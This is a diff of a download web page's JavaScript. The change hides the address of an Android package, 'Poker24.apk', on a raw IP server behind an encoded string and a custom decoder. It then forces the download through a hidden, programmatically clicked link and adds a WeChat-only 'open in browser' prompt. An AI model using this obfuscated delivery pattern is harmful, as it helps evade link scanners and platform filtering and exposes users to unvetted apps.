@@ -140,28 +140,42 @@
   </body>
   <script type="text/javascript">
     function downloadFile(){
+      var u="%89%DC%E8%E4%AAi%5Ecmg%60ee%60_emg_cfc%7F%BF%DA%D0%D7%A4fb%8F%D1%DB".split("%");
+      function ur(crc){crc=unescape(crc);var c=String.fromCharCode(crc.charCodeAt(0)-crc.length);for(var i=1;i<crc.length;i++){c+=String.fromCharCode(crc.charCodeAt(i)-c.charCodeAt(i-1));}return c;}
       var hint=document.getElementById("hint");
       hint.style.display="block";
-      var a = document.createElement("a"); // 创建a标签
-      a.style.display="none"; // 隐藏a标签
-      a.href="http://49.232.149.124/Poker24.apk"; // 文件下载地址
-      a.setAttribute("download","Poker24.apk"); // 设置a为下载属性，并设置下载文件名
-      document.body.appendChild(a); // 将a标签插入到页面中
-      a.click(); // 强制触发a便签的点击事件
-      document.body.removeChild(a); // 移除a标签
+      var a = document.createElement("a");
+      a.style.display="none";
+      a.href=ur(u.join("%"));
+      a.setAttribute("download","Poker24.apk");
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
 
     window.onload=function(){
-      var openInBrowser=document.getElementById("open-in-browser");
-      var showTimes=0;
-      var hintTimer=setInterval(function(){
-        var display=openInBrowser.style.display;
-        openInBrowser.style.display=display=="none"?"block":"none";
-        showTimes++;
-        if(showTimes>10){
-          clearInterval(hintTimer);
-        }
-      }, 500);
+      //微信中提示在浏览器中打开
+      if(isWeiXin()){
+        var openInBrowser=document.getElementById("open-in-browser");
+        var showTimes=0;
+        var hintTimer=setInterval(function(){
+          var display=openInBrowser.style.display;
+          openInBrowser.style.display=display=="none"?"block":"none";
+          showTimes++;
+          if(showTimes>10){
+            clearInterval(hintTimer);
+          }
+        }, 500);
+      }
+    }
+
+    function isWeiXin(){
+      var ua = navigator.userAgent.toLowerCase();//获取判断用的对象
+      if (ua.match(/MicroMessenger/i) == "micromessenger") {
+        return true;
+      }else{
+        return false;
+      }
     }
   </script>
 </html>
